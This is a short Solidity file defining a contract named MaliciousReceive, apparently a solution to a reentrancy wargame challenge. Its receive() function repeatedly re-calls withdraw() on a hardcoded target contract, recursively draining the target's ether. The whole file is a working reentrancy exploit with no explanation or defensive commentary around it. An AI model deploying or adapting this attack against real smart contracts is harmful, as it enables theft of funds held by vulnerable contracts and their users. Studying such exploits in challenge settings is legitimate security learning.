// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function withdraw(uint256) external;
}

contract MaliciousReceive {
    address constant target = 0xb61bb0780b0e8f03F2b6783dDA22DCb8bc4fe908;

    constructor() {}

    function siphon(uint256 _amount) public payable {
        IReentrance(target).withdraw(_amount);
    }

    receive() external payable {
        siphon(msg.value);
    }
}
